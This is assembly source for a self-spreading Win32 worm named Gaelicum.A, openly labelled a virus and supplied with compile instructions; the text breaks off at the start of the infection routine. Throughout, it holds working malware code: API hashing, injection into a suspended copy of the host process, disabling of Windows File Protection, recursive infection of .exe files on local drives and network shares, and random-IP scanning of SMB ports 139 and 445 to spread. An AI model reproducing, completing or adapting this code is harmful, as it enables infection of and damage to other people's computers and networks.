;      Title:  Win32 Gaelicum.A
;  Platforms:	Win9x/ME/2000/XP/2003
;
;
;   This is the source code of a VIRUS. At the date of today a source
;   cannot do any kind of damage to your comp. Use it at your own risk.
;   The author is not responsabile of any damage that may occur due to
;   the assembly of this file.
;
;   컴컴컴컴
;   Features
;   컴컴컴컴
;
;   Win32 (tested under W95/W2k/XP) run-time virus. Infects 
;   EXE files increasing the last section. 
;   Uses hash values to find APIs instead of names. Support Export 
;   Forwarding for APIs like GetLastError which are inside others DLLs.
;   Spreads across the local network as well as
;   remote netbios shares.
;   Makes use some of some undocumented functions of sfc.dll
;   to disable System File Protection.
;   Infecting the file ntoskrnl.exe seems to create some problem under
;   Win XP, so does not infect this file.
;   Very fast/optimized scanning routine using non-blocking sockets.
;   Generates random IP addresses trying the next network class whenever 
;   active hosts are found.
;
;
;To compile:
;nasmw -fwin32 -O6 vx.asm
;link /RELEASE /entry:entry /subsystem:windows vx.obj kernel32.lib
;must be linked with indirect jmp


	%xdefine	ExitProcess	_ExitProcess@4
	EXTERN	ExitProcess
	OEP		EQU	ExitProcess

%error	"This file will infect your system!!"




ERROR_ALREADY_EXISTS	EQU	183
DETACHED_PROCESS	EQU	8
CREATE_SUSPENDED	EQU	4
PAGE_EXECUTE_READWRITE	EQU	64
FIONBIO			EQU	0x8004667e
RESOURCEUSAGE_CONTAINER	EQU	2
RESOURCETYPE_DISK	EQU	1
ERROR_MORE_DATA		EQU	234
SCAN_THREADS		EQU	10
MAX_THREADS		EQU	50	;only @FindShares threads


CPU 386
[BITS 32]

section .text execute
GLOBAL _entry

BASE_ADDRESS		EQU	0x400000

_entry:
        push edx                ; <- return address
        pushad
        mov ecx, dword (OEP - BASE_ADDRESS)      ;change with OLD_EP
START_SIZE              EQU     ($ - _entry)
        call .delta
.delta
        pop edi
.fndmz
	dec edi
	xor di, di
	cmp word [edi], 'MZ'
	jnz .fndmz
	add ecx, edi		;OEP VA

	mov ebp, esp
        mov [ebp + 0x20], ecx   ;ret

	cld
	call Kernel32Base

startcode:
	pop eax
	call eax

; ARGS:		edx: API name hash
;		ebx: dll address
; Return:	eax: API address
; ERROR:	ecx == 0
LGetProcAddress:		; USES ebx ebp esi edi
	push ebp
	push esi
	push edi
	mov eax, [ebx + 0x3c]
	lea esi, [ebx + eax + 0x78]
	lodsd			; Export Table RVA
	push dword [esi]	; Export Table size
	add eax, ebx		; Export Table address
	push eax
	mov ecx, [eax + 0x18]	; NumberOfNames
	mov ebp, [eax + 0x20]
	add ebp, ebx		; AddressOfNames

.Nextf
	jecxz	.End1
	dec ecx
	mov esi, [ebp + ecx * 4]
	add esi, ebx
	xor edi, edi

.Lhash
	xor eax, eax
	lodsb
	cmp al, ah
	je .Fh
	ror edi, 13
	add edi, eax
	jmp short .Lhash

.Fh
	cmp edi, edx
	jnz .Nextf

	pop ebp				; Export Table
	mov edx, [ebp + 0x24]
	add edx, ebx			; AddressOfNameOrdinals
	mov cx, [edx + ecx * 2]
	mov edx, [ebp + 0x1C]
	add edx, ebx			; AddressOfFunctions
	mov eax, [edx + 4 * ecx]
	add eax, ebx

.FDone
	pop ecx		; Export Table size
	push eax
	sub eax, ebp
	cmp eax, ecx
	pop eax
	ja .End2

	xchg esi, eax		; Export Forwarding
	sub esp, byte 0x40
	mov edi, esp

.FCopy
	stosb
	lodsb
	cmp al, '.'
	jne .FCopy

	mov byte [edi], 0
	mov edi, esp
	inc edi

	mov ebp, [esp + 0x48]		; old EBP
	push edi
	call [ebp - __LOADLIBRARY]
	push esi
	push eax
	call [ebp - __GETPROCADDR]
	add esp, byte (0x40 - 8)
	mov ecx, eax	;ecx != 0

.End1
	add esp, byte 8
.End2
	pop edi
	pop esi
	pop ebp
	ret


Kernel32Base:
	mov eax, [fs:0x30]
	test eax, eax
	js .find_kernel32_9x
.find_kernel32_nt
	mov eax, [eax + 0x0c]
	mov esi, [eax + 0x1c]
	lodsd
	mov ebx, [eax + 0x8]
	jmp short .kf
.find_kernel32_9x
	mov eax, [eax + 0x34]
	mov ebx, [eax + 0xB8]
.kf

	pop esi
	add esi, byte (LGetProcAddress - startcode)

    ; ebx = kernel32
    ; esi = LGetProcAddress
    ; edi = MZ Header (EXE)


    push ebx				; __KERNEL32

    mov edx, 0xec0e4e8e			; LoadLibraryA
    call esi
    push eax				; __LOADLIBRARY

    mov edx, 0x7c0dfcaa			; GetProcAddress
    call esi
    push eax				; __GETPROCADDR
    push edi				; __HINSTANCE


	__KERNEL32	EQU	0x4	;[ebp - 4]
	__LOADLIBRARY	EQU	0x8	;[ebp - 8]
	__GETPROCADDR	EQU	0xC	;[ebp - 0xC]
	__HINSTANCE	EQU	0x10	;[ebp - 0x10]


    mov edx,  0x4ee4a045	    ; CreateMutexA	
    call esi

	xor edx, edx
    push edx
    push 'icum'		;opt.
    push 'gael'
    push esp
    push edx
    push edx
    call eax		; CreateMutexA

	push eax		; CloseHandle

    mov edx, 0x75da1966		; GetLastError
    call esi
	call eax
	xchg edi, eax

	mov edx, 0x0ffd97fb		; CloseHandle
	call esi
	call eax		; CloseHandle(hMutex)

    cmp edi, ERROR_ALREADY_EXISTS
    jne .payload

.oep
    mov esp, ebp
    popad
    ret			    ; jump to OEP

;DEBUG ALIGN


.payload
    call .LoadFunc

		STACK_CNT	EQU	(__HINSTANCE + 0xC)
.apihash
	_CloseHandle		EQU		((1*4) +STACK_CNT)
		dd 0x0ffd97fb
	_GetModuleFileNameA	EQU		((2*4) +STACK_CNT)
		dd 0x45b06d76
	_CreateProcessA		EQU		((3*4) +STACK_CNT)
		dd 	0x16b3fe72
	_WriteProcessMemory	EQU		((4*4) +STACK_CNT)
		dd 	0xd83d6aa1
	_GetThreadContext	EQU		((5*4) +STACK_CNT)
		dd 	0x68a7c7d2
	 _SetThreadContext	EQU		((6*4) +STACK_CNT)
		dd 	0xe8a7c7d3
	 _ResumeThread		EQU		((7*4) +STACK_CNT)
		dd 	0x9e4a3f88

	_KERNEL32_APINUM	EQU		(($-.apihash)/4)

.LoadFunc
	xchg edi, esi		; edi = LGetProcAddress
    pop esi

    push byte _KERNEL32_APINUM
    pop ecx
    
.loop1:
	push ecx
	lodsd
	mov edx, eax
	call edi		; LGetProcAddress
	pop ecx
	push eax		; save APIs addresses on stack
	loop .loop1

    inc ch
    sub esp, ecx	; 0x100 (256)
    mov eax, esp
    push ecx
    push eax
    push byte 0
    call [ebp - _GetModuleFileNameA]

    mov ebx, esp	; host filename
    sub esp, 0x200			;(512 bytes)
    lea edi, [esp + 0x10]
    push esp		; PROCESS_INFORMATION
    push edi		; STARTUPINFO
	push byte 0x44
	pop ecx
    mov [edi], ecx
	inc edi
    xor eax, eax
    rep stosb

    push eax
    push eax
    push byte (CREATE_SUSPENDED | DETACHED_PROCESS)
    push eax
    push eax
    push eax
    push eax           ; lpCmdLine
    push ebx           ; lpFileName
    call [ebp - _CreateProcessA]

	mov edi, [ebp - __HINSTANCE]
	mov eax, [edi + 0x3c]
	add eax, edi
	mov eax, [eax + 0x2c]	; BaseOfCode
	add edi, eax

	pop esi			; hProcess
	push byte 0
	push VIRUS_SIZE
	call startcode
	pop eax
	sub eax, byte (LGetProcAddress - _entry)	; WARN
	push eax
	push edi			; BaseAddress
	push esi
	call [ebp - _WriteProcessMemory]
	or eax, eax
	jz .oep2			; failed

	push esi
	call [ebp - _CloseHandle]

	pop esi					; hThread
	push dword 0x10007			; CONTEXT_FULL

	push esp
	push esi
	call [ebp - _GetThreadContext]

	add edi, (@virus_ep - _entry)
	mov ebx, esp
	mov [ebx + 0xb8], edi			; Eip to injected code
	push esi				; CloseHandle
	push esi				; ResumeThread
	push ebx				; SetThreadContext
	push esi				;	``	 ``
	lea edi, [ebx + 0x9c]			; context.Edi
	lea esi, [ebp - __GETPROCADDR]
	movsd					; edi = GetProcAddress
	movsd					; esi = LoadLibraryA
	movsd					; ebx = kernel32
	call [ebp - _SetThreadContext]
	call [ebp - _ResumeThread]
	call [ebp - _CloseHandle]

.oep2
    mov esp, ebp
    popad
    ret			    ; jump to OEP



@virus_ep:				; Vx ENTRY POINT
	cld
	mov ebp, esp
	push ebx			; kernel32		[ebp - 0x4]
	push esi			; LoadLibraryA		[ebp - 0x8]
	push edi			; GetProcAddress	[ebp - 0xC]
	%xdefine	__VAR1		[ebp - 0x10]


	call startcode
	pop esi

	mov edx, 0x4ee4a045     ; CreateMutexA
	call esi
    push byte 0
    push 'icum'
    push 'gael'
    push esp
    push byte 1
    push byte 0
    call eax
    push byte -1	;WaitForSingleObject(gaelicum, INFINITE)
    push eax		;``

	mov edx, 0x91afca54		; VirtualAlloc
	call esi

	push byte PAGE_EXECUTE_READWRITE
	pop ecx
	push ecx
	shl ecx, 6				; 0x1000 (MEM_COMMIT)
	push ecx
	push ecx
	push byte 0
	call eax				; VirtualAlloc

	lea edi, [eax + 0x7C]
	mov __VAR1, esi
	lea esi, [ebp - __GETPROCADDR]

	movsd
	movsd
	movsd

	push edi
	call .LoadAll

	%define		K32_APIOFFS	($-.k32_api)
	db K32_APINUM
.k32_api
		Sleep				EQU	K32_APIOFFS
	dd 0xdb2d49b0		
		CreateThread		EQU	K32_APIOFFS
	dd 0xca2bd06b	
		GetVersion			EQU	K32_APIOFFS
	dd 0xcfd98161
		ExitThread			EQU	K32_APIOFFS
	dd 0x60e0ceef
		CloseHandle			EQU	K32_APIOFFS
	dd 0x0ffd97fb
		GlobalAlloc			EQU	K32_APIOFFS
	dd 0x0c0397ec
		GlobalFree			EQU	K32_APIOFFS
	dd 0x7cb922f6
		CreateMutexA		EQU	K32_APIOFFS
	dd 0x4ee4a045
		WaitForSingleObject		EQU	K32_APIOFFS
	dd 0xce05d9ad
		ReleaseMutex		EQU	K32_APIOFFS
	dd 0x14a059e5
		GetTickCount		EQU	K32_APIOFFS
	dd 0xf791fb23
		GetCurrentThreadId 	EQU	K32_APIOFFS
	dd 0x35bbf99e
		lstrlenA			EQU	K32_APIOFFS
	dd 0xdd43473b
		lstrcmpiA			EQU	K32_APIOFFS
	dd 0x4b1e5adb
		FindFirstFileA		EQU	K32_APIOFFS
	dd 0x63d6c065   
		FindNextFileA		EQU	K32_APIOFFS
	dd 0xa5e1ac97
		FindClose			EQU	K32_APIOFFS
	dd 0x23545978
		CreateFile			EQU	K32_APIOFFS
    dd 0x7c0017a5
		ReadFile			EQU	K32_APIOFFS
	dd 0x10fa6516   
		WriteFile			EQU	K32_APIOFFS
	dd 0xe80a791f   
		SetFilePointer		EQU	K32_APIOFFS
	dd 0x76da08ac
		GetLogicalDriveStrings		EQU	K32_APIOFFS
	dd 0x79b4095d
		SetEndOfFile		EQU	K32_APIOFFS
	dd 0x96a028a6

	K32_APINUM		EQU		(($-.k32_api)/4)


	%define		WSOCK_APIOFFS		($-.wsock_api)
	db 'WSOCK32',0		; dword align!!
	db  WSOCK32_APINUM

.wsock_api
		WSAStartup		EQU	(WSOCK_APIOFFS+(K32_APINUM*4))
	dd	0x3bfcedcb   
		gethostbyname		EQU	(WSOCK_APIOFFS+(K32_APINUM*4))
	dd 	0x510cfdc4		
		 socket			EQU	(WSOCK_APIOFFS+(K32_APINUM*4))
	dd	0x492f0b6e	
		 ioctlsocket		EQU	(WSOCK_APIOFFS+(K32_APINUM*4))
	dd	0xede29208	
		 closesocket		EQU	(WSOCK_APIOFFS+(K32_APINUM*4))
	dd	0x79c679e7	
		 connect			EQU	(WSOCK_APIOFFS+(K32_APINUM*4))
	dd	0x60aaf9ec
	  	 select				EQU	(WSOCK_APIOFFS+(K32_APINUM*4))
	dd	0x5b1e69ee   
		getpeername			EQU	(WSOCK_APIOFFS+(K32_APINUM*4))
	dd	0x95066ef2
		inet_ntoa			EQU	(WSOCK_APIOFFS+(K32_APINUM*4))
	dd	0x4a121b5c

	WSOCK32_APINUM		EQU		(($-.wsock_api)/4)


	%define		MPR_APIOFFS		($-.mpr_api)
	db 'MPR',0
	dd 0				; dword align!!
	db  MPR_APINUM

.mpr_api
		WNetOpenEnumA		EQU	(MPR_APIOFFS+(WSOCK32_APINUM*4)+(K32_APINUM*4))
	dd	0x70a02142
		WNetEnumResourceA	EQU	(MPR_APIOFFS+(WSOCK32_APINUM*4)+(K32_APINUM*4))
	dd	0xf6337650
		WNetCloseEnum		EQU	(MPR_APIOFFS+(WSOCK32_APINUM*4)+(K32_APINUM*4))
	dd	0x930a1f30		

	MPR_APINUM		EQU		(($-.mpr_api)/4)


; Global Vars
	%define		CONNECTED	[edi - 0x10]		;BYTE
	%define		MTX_LOOP	[edi - 0x14]		;DWORD
	%define		LOCALIP		[edi - 0x18]		;DWORD
	%define		THREADNUM	[edi - 0x1C]		;DWORD
	%define		MTX_THREADNUM	[edi - 0x20]		;DWORD
	%define		TIMEOUT		[edi - 0x24]		;DWORD
	%define		OSVERSION	[edi - 0x28]		;DWORD



.LoadAll
	pop esi
	push byte 3
	pop ecx				; DLL num

.LoadNextDll
	push ecx		; DLL num

	xor eax, eax
	lodsb
	xchg ecx, eax		; Api num


.LoadNextApi
	push ecx
	lodsd
	mov edx, eax		; hash
	call __VAR1		; LGetProcAddress
	stosd

	pop ecx
	loop .LoadNextApi

	pop ecx
	dec ecx
	jz .Loaded
	push ecx
	push esi
	call [ebp - __LOADLIBRARY]
	xchg ebx, eax
	add esi, byte 8
	pop ecx
	jmp short .LoadNextDll

.Loaded
	pop edi				; heap mem
	call [edi + WaitForSingleObject]	;gaelicum, -1

	xor ecx, ecx
	push ecx
	push esp			; lpThreadId
	push ecx
	push edi			; lpParameter
	call @Get_InfectFileSystem
	mov cl, 8
.push0
	push byte 0
	loop .push0

	call [edi + CreateMutexA]

;set global vars
	mov dword TIMEOUT, 5000
	mov MTX_LOOP, eax		;socket/connect loops

	call [edi + CreateMutexA]
	mov MTX_THREADNUM, eax		;@FindShares threads

	call [edi + CreateThread]
	push eax
	call [edi + CloseHandle]


.WaitNetworkConn

	sub esp, 0x200
	push esp
	push byte 2
	call [edi + WSAStartup]

	mov CONNECTED, al		;FALSE

.NotConn				;Primary Thread loop
	push dword TIMEOUT
	call [edi + Sleep]

	call @GetLocalIp
	jz .NotConn

	mov LOCALIP, eax
	mov byte CONNECTED, 1		;TRUE
	call [edi + GetVersion]
	mov OSVERSION, eax
	push byte 1+1
	or eax, eax
	js .9x		; Win95 has the HO bit set

	pop ecx
	push byte SCAN_THREADS +1

.9x
;can't 9x handle more than 100 sockets (??)
	pop ecx

	call @Get_Scan
	pop ebx

.CreateScanThreads
	push ecx
	push ecx
	push esp
	xor edx, edx
	push edx
	push edi		;lpParameter
	push ebx		;lpStartRoutine
	dec ecx
	jnz .scan

.cback
	pop ebx
	call @Get_Cback		;Cback shell thread
.scan
	push edx
	push edx
	call [edi + CreateThread]
	push eax
	call [edi + CloseHandle]
	pop ecx
	pop ecx
	loop .CreateScanThreads

.Conn
	push dword TIMEOUT
	call [edi + Sleep]

	call @GetLocalIp
	jnz .Conn

	mov byte CONNECTED, 0		;FALSE
	jmp short .NotConn


@Get_InfectFileSystem:
	pop edx
	call edx

;do PE infection
@InfectFileSystem:
	mov ebp, esp
	mov edi, dword [ebp + 0x4]

	call @SFC_Disable

	sub esp, byte 0x7c
	push esp
	push byte 0x7c
	call [edi + GetLogicalDriveStrings]
	mov esi, esp


.next_drive
	cmp byte [esi], byte 0
	je .InfectLocalNet

	and byte [esi], 0xDF
	cmp byte [esi], 'A'	;WARN
	je .1

	mov eax, esi
	call @InfectSubDir

.1
	lodsb
	cmp al, 0
	jne .1

	jmp short .next_drive


.InfectLocalNet

	xor esi, esi		;local net
	call @BrowseNet

	call [edi + ExitThread]


; Browse local/remote networks
; ARGS: esi:lpNetResource
;
@BrowseNet:
	push esi
	push ebp
	mov ebp, esp


	xor ebx, ebx
	push ebx
	push esp	;lphEnum
	push esi	;lpNetResource
	push ebx	;0 All resources
	push ebx	;RESOURCETYPE_ANY
	push byte 2	;RESOURCE_GLOBALNET
	call [edi + WNetOpenEnumA]

        or eax, eax
        jnz .return

	pop ebx		;hEnum
	mov esi, 0x2000
	push esi
	push eax	;GMEM_FIXED
	call [edi + GlobalAlloc]
	or eax, eax
	jz .exit

	push eax
;	%xdefine	lpBuffer	dword [ebp - 4]

	push byte -1
	mov edx, esp	;lpcCount
	push esi
	push esp	;lpBufferSize
	push eax	;lpBuffer
	xchg esi, eax
	push edx	;lpcCount
	push ebx	;hEnum
	call [edi + WNetEnumResourceA]
	add esp, byte 8
	cmp al, ERROR_MORE_DATA
	je .1
	or eax, eax
	jnz .free

.1
	mov ecx, [esp - 4]
	or ecx, ecx
	jz .free
	push ebx

.loop1
	push ecx
	test byte [esi + 0xC], RESOURCEUSAGE_CONTAINER
	jnz .container

	test byte [esi + 0x8], RESOURCETYPE_DISK
	jz .2

	mov eax, [esi + 0x14]		;lpRemoteName
	call @InfectSubDir
	jmp short .2

.container
	call @BrowseNet		;recursive

.2
	add esi, byte 0x20
	pop ecx
	loop .loop1

	pop ebx
.free
	call [edi + GlobalFree]

.exit
	push ebx
	call [edi + WNetCloseEnum]

.return
	leave
	pop esi
	ret



;RETURN: ZF=1 if network down (eax=127.0.0.1), ZF=0 otherwise (eax=ip)
@GetLocalIp:
	push byte 0
	call [edi + gethostbyname]
	or eax, eax
	jz .end
	mov esi, [eax + 12]		;h_addr_list
	push eax

.1
	pop ecx
	push eax
	lodsd
	or eax, eax
	jz .2
	mov eax, [eax]
	jmp short .1

.2
	pop eax
	cmp al, 127
.end
	ret


@Get_Scan:
	pop eax
	call eax

@Scan:
	mov ebp, esp
	mov edi, [ebp + 4]
	xor ebx, ebx

	push ebx
	push ebx
				%xdefine	 _139OPEN	[ebp - 0x4]
				%xdefine	 NUM_IPDUP	[ebp - 0x8]
	push ebx
	push ebx	;sin.zero
	push ebx	;ip

				%xdefine	 IP_4	[ebp - 0x11]	;class D
				%xdefine	 IP_3	[ebp - 0x12]	;class C
				%xdefine	 IP_2	[ebp - 0x13]	;class B
				%xdefine	 IP	[ebp - 0x14]



	mov bl, 0x8B	;port 139	(PORT_LO)
	shl ebx, 24
				%xdefine	 PORT_LO	[ebp - 0x15] ; high mem B.E.
				%xdefine	 PORT_HI	[ebp - 0x16] ; low mem B.E.
	mov bl,2
	push ebx		;AF_INET | port
				%xdefine	 SIN	[ebp - 0x18]

	%xdefine	IPDUP_SIZE	((64+1)*4)
	sub esp, IPDUP_SIZE + 4
				%xdefine	 RAND_SEED	[ebp - 0x1C]
				%xdefine	 ARR_IPDUP	[ebp - (IPDUP_SIZE+0x1C)]
				LOCAL_DATA_SIZE  EQU	(IPDUP_SIZE+0x1C)

	call @randinit

	mov esi, MTX_THREADNUM		;WARN
	push byte 0
	push esi
	call [edi + WaitForSingleObject]
	or eax, eax
	jnz .1
		mov edx, LOCALIP	;scan local net
		mov IP, edx
		mov IP_4, al		;0

		push dword TIMEOUT
		call [edi + Sleep]
		push esi
		call [edi + ReleaseMutex]
	jmp short @Net_loop.s

.1
	jmp short @Net_loop.Next_Net

@Net_loop
	mov byte IP_4, 0
	xor word PORT_HI, 0x3601	; 139<=>445
	cmp byte PORT_HI, 0
	je .Next_Net		; 139

	jmp short @sock_arr	; 445	(rescan same net)

.Next_Net
	cmp dword _139OPEN, byte 0
	jnle .c
.r
	call @GetRandomNet
	mov IP, ebx
	jmp short .s
.c
	inc byte IP_3		; inc class C net
	jnz .s
	inc byte IP_2		; inc class B
	jz .r
.s
	xor ecx, ecx
	mov NUM_IPDUP, ecx	;clear ARR_IPDUP

@sock_arr
	push byte 64
	pop ecx

@sock_loop
	inc byte IP_4
	cmp byte IP_4, 0xFF
	je @Select
	push ecx			; counter

		push byte 0
		push byte 1
		push byte 2
		call [edi + socket]
		mov ebx, eax
		push esp			; ecx = TRUE
		push FIONBIO
		push ebx
		call [edi + ioctlsocket]

		push byte 0x10
		lea eax, SIN
		push eax
		push ebx
		call [edi + connect]
		call @sleep

	pop ecx
	push ebx		;save sockets on stack
	loop @sock_loop

@Select
	mov ch, 64
	sub ch, cl
	jz @end_loop		; (<- should never happen)
	movzx ecx, ch
	mov esi, esp
	mov ebx, esp		; socket array
	mov _139OPEN, ecx

.fd_set:
	lodsd
	push eax		; fd_array
	call @sleep
	loop .fd_set

	mov edx, _139OPEN
	push edx		; fd_count
	mov esi, esp

	push edx	 	; CloseSockArr (sock count <= 64)
	push ebx		; CloseSockArr (pointer to socket array)

	push ecx
	push ecx
	push esp		; tv { 0,0 } poll
	push ecx		; exceptfds
	push esi		; writefds
	push ecx		; readfds
	push ecx
	push dword TIMEOUT	; 5 sec.
	call [edi + Sleep]
	call [edi + select]
	add esp, byte 8
	mov _139OPEN, eax

	or eax, eax
	jle @select_end		; 0 | -1

	lodsd			; fd_count
	mov ecx, eax

.open_loop
	lodsd			; fd_array
	call @PortOpen
	call @sleep
	loop .open_loop

@select_end
	call @CloseSockArr		; ebx, edx
@end_loop
	mov esp, ebp
	sub esp, LOCAL_DATA_SIZE

	cmp byte CONNECTED, 0
	je .Exit_Scan			; disconnected

	mov eax, OSVERSION
	or eax, eax
	jns .2

	;only for Win9x
	cmp dword _139OPEN, byte 0

	jle .40
	jmp short .240

.40
	push dword 40 * 1000		;40 sec.
	jmp short .sleep
.240
	push dword 240 * 1000		;4 min. (TIME_WAIT delay)

.sleep
	call [edi + Sleep]

.2
	cmp byte IP_4, 0xFF
	je  @Net_loop
	jmp @sock_arr

.Exit_Scan
	call [edi + ExitThread]


@randinit:
	call [edi + GetCurrentThreadId]
	mul ah
	xchg al, ah
	mul ax
	shl eax, 16
	mov ax, dx
	push eax
	call [edi + GetTickCount]
	pop ecx
	mul ecx
	rol eax, cl
	mov RAND_SEED, eax
	ret


@sleep:
	push ecx
	mov eax, MTX_LOOP
	push eax
	push byte -1
	push eax
	call [edi + WaitForSingleObject]
		push byte 1
		call [edi + Sleep]
	call [edi + ReleaseMutex]
	pop ecx
	ret


@CloseSockArr:
	mov ebx, [esp + 4]	; socket array
	mov ecx, [esp + 8]	; count

.close_loop:

	dec ecx
	push ecx

	push dword [ebx + ecx * 4]
	call [edi + closesocket]
	call @sleep

	pop ecx
	inc ecx
	loop .close_loop

	ret 8


@PortOpen:		; eax: socket
	push ecx
	push esi

	sub esp, byte 0x10	; 0x10 bytes stack frame
	mov edx, esp
	push byte 0x10
	push esp		; len
	push edx		; sockaddr
	push eax
	call [edi + getpeername]

	add esp, byte 8
	or eax, eax
	jnz .end

	pop eax
	push eax
	cmp eax, LOCALIP
	je .end

		lea ebx, ARR_IPDUP
		mov ecx, NUM_IPDUP
		or ecx, ecx
		jz .addip

		push edi
		push ecx
		mov  edi, ebx
		repne scasd
		pop ecx
		pop edi
		je .end		;ip already probed

.addip
		mov [ebx + ecx*4], eax
		inc ecx
		mov NUM_IPDUP, ecx


	xchg esi, eax
	push byte 8
	push byte 0
	call [edi + GlobalAlloc]
	or eax, eax
	jz .end

	mov [eax], edi				;mem+0	= edi
	mov [eax + 4], esi	;ip		;mem+4  = ULONG ip
	mov esi, eax

	xor ecx, ecx
	push esp	;lpThreadId
	push ecx	;dwCreationFlags
	push esi	;lpParameter
	call @Get_FindShares
	push ecx
	push ecx
	call [edi + CreateThread]
	push eax
	call [edi + CloseHandle]
	or eax, eax
	jnz .end
					;<- ?? error
	push esi
	call [edi + GlobalFree]

.end
	call @WaitMaxThreads
	add esp, byte 0xC
	pop esi
	pop ecx
	ret


@rand:
 push ecx
 mov eax, RAND_SEED
 mov cl, al
 rol eax, cl	; rotate left, bits shifted out reenter on the right
 push eax
 push ecx
 call [edi + GetTickCount]
 mov cl, al
 ror eax, cl
 pop ecx
 rol eax, cl
 pop edx
 add edx, eax		;add some big number
 mov eax, edx
 mov ecx, eax
 mul ecx
 mov cl, al
 rol eax, cl
 xor eax, edx
 mov RAND_SEED, eax	; store random seed

 pop ecx
 xor edx, edx		; zero edx for edx:eax MOD ecx
 div ecx		; divide by ecx, remainder in edx
 xchg eax, edx

 ret


;RETURN:	ebx
;
@GetRandomNet:
	xor ebx, ebx

	push byte 3
	pop ecx

.rnd
	push ecx
	mov cx, 256
	call @rand

	pop ecx
	push ecx
	sub ecx, byte 3
	neg ecx
	imul ecx, byte 8
	shl eax, cl
	pop ecx
	or eax, ebx

	cmp al, 0
	je .rnd
	cmp al, 10
	je .rnd
	cmp al, 127
	je .rnd
	cmp al, 223
	ja .rnd

	cmp al, 172
	jne .b
	cmp ah, 16
	jb .b
	cmp ah, 31
	jbe .rnd
.b
	cmp al, 192
	jne .next
	cmp ah, 168
	je  .rnd

.next:
	or ebx, eax
	loop .rnd
	
	ret
	


@Get_FindShares:
	pop edx
	call edx

@FindShares:
	mov ebp, esp
	sub esp, byte 0x40	;0x40 bytes stack frame
	mov esi, [ebp + 4]	;struct { edi,  ULONG ip } *data;
	mov edi, [esi]
	push dword [esi + 4]
	push esi
	call [edi + GlobalFree]

	push byte 1
	call @AddThreadNum	;inc THREADNUM
	call @WaitMaxThreads

	call [edi + inet_ntoa]
	or eax, eax
	jz .exit

	xchg esi, eax
	mov [ebp], edi
	mov edi, esp
	mov al, '\'
	stosb
	stosb
	push byte 0x4
	pop ecx
	rep movsd
	mov edi, [ebp]

	mov edx, esp	;lpRemoteName
	push ecx		;lpProvider
	push ecx		;lpComment
	push edx		;lpRemoteName
	push ecx		;lpLocalName
	push byte 2		;RESOURCEUSAGE_CONTAINER
	push ecx		;RESOURCEDISPLAYTYPE_GENERIC
	push byte 1		;RESOURCETYPE_DISK
	push byte 2		;RESOURCE_GLOBALNET
	mov esi, esp	;NETRESOURCE

	call @BrowseNet

.exit
	push byte -1
	call @AddThreadNum	;dec THREADNUM

	call [edi + ExitThread]



;	ARGS: 1 inc	-1 dec
;	Registers used: ALL
@AddThreadNum:
	pop eax		;RET/clean stack
	pop ebx
	push eax

	lea esi, MTX_THREADNUM
	lodsd
	push eax
	push byte -1
	push eax
	call [edi + WaitForSingleObject]

		add dword [esi], ebx	;THREADNUM

	call [edi + ReleaseMutex]
	ret


@WaitMaxThreads:
.loop1
	cmp dword THREADNUM, MAX_THREADS
	jle .end
	push dword TIMEOUT
	call [edi + Sleep]

	jmp short .loop1
.end
	ret


@InfectSubDir:		; Arguments: eax: remote (UNC) or local path

	push ebx
	push esi
	mov esi, eax
	mov ebx, 640	;(MAX_PATH + WIN32_FIND_DATA)
	push ebx
	push byte 0
	call [edi + GlobalAlloc]
	or eax, eax
	jz .end

	push eax
	push edi
	mov edi, eax

	push edi
.1
	lodsb
	stosb
	or al, al
	jnz .1

	mov edx, ebx	;640
	shr edx, 1		;320

	pop ebx
	add edx, ebx	;WIN32_FIND_DATA
	pop edi
	xor esi, esi
	call @DirScan

	call [edi + GlobalFree]

.end
	pop esi
	pop ebx
	ret



; Scan directories recursively and finds *.exe files
; ARGS:  
;	edx: WI32_FIND_DATA addr
;	ebx: BasePath (ie. C:\)	
;	esi:CurrentDir (ie. WINNT)
; esi MUST BE 0 if not called recursively

;RETURN: void

@DirScan:
	push ebp
	mov ebp, esp
	push edx

	push ebx
	call [edi + lstrlenA]
	push edi
	push eax

	or esi, esi
	jnz .1
	pop eax
	cmp byte [ebx + eax -1], '\'
	jne .2
	dec eax
	jmp short .2

.1
		push esi
		call [edi + lstrlenA]
		xchg ecx, eax

		pop eax
		lea edi, [ebx + eax]
		add eax, ecx
		inc ecx
		rep movsb
.2
	call .ext
		db '\*.*',0
.ext
	pop esi
	lea edi, [ebx+eax]
	push edi
	movsd
	movsd

	pop esi
	inc esi
	pop edi
	push ebx
	push esi
%define		LPWIN32_FIND_DATA	dword [ebp - 0x4]
%define		lpBasePath		dword [ebp - 0x8]
%define		lpBasePathEnd		dword [ebp - 0xC]	;trailing '\' not inclused

	push LPWIN32_FIND_DATA
	push ebx	;BasePath
	call [edi + FindFirstFileA]
	mov byte [esi], 0		; remove '*.*' from BasePath
	
	cmp eax, byte -1
	je .end

	mov esi, eax

.findloop
	mov ebx, LPWIN32_FIND_DATA
	test byte [ebx], 16			;FILE_ATTRIBUTE_DIRECTORY
	lea ebx, [ebx + 44]			;cFileName
	jz .isfile

		cmp byte [ebx], '.'
		je .next

		  push esi
		mov edx, LPWIN32_FIND_DATA
		mov esi, ebx
		mov ebx, lpBasePath
		call @DirScan			;recursive
		  pop esi
		  jmp short .next

.isfile
	push ebx
	call [edi + lstrlenA]
	push eax		;cFileName len
	call .exe
		db '.exe',0
.exe	
	lea ecx, [ebx + eax -4]
	push ecx
	call [edi + lstrcmpiA]
	or eax, eax
	pop ecx			;cFileName len
	jnz .next

	push esi
	push edi
	mov esi, ebx	;cFileName
	mov edi, lpBasePathEnd
	inc ecx			;NULL term.
	rep movsb
	pop edi

	mov eax, lpBasePath
	call @Infect
	pop esi

.next
	mov ebx, lpBasePathEnd
	mov byte [ebx], 0

	push LPWIN32_FIND_DATA
	push esi		;hFindFile
	push byte 1
	call [edi + Sleep]
	call [edi + FindNextFileA]
	or eax, eax
	jnz .findloop

.close
	push esi
	call [edi + FindClose]

.end:
	leave
	ret



SIGN_BYTE	equ	'V'	;infection mark
SIGN_OFFS	equ	0x32	;MZ Header e_res2
PE_SIZE		equ	0x58	;cbToRead from PE HDR (FILE+OPT. header <= SizeOfHeaders)
%xdefine		PE_ADDR		[ebp - (0x20 + PE_SIZE)]

; Infection Routine
; ARGS:   eax: file path
; RETURN: void
; USES	esi

@Infect:
	push ebp
	mov ebp, esp
	sub esp, byte 0x20		; 0x20 bytes stack frame
%xdefine	OLD_EP			[ebp - 0x4]
%xdefine	NEW_EP			[ebp - 0x8]
%xdefine	FILE_ALIGN		[ebp - 0xC]
%xdefine	WRITE_AREA		[ebp - 0x10]
%xdefine	VirtualSize		[ebp - 0x14]
%xdefine	VirtualAddress	[ebp - 0x18]
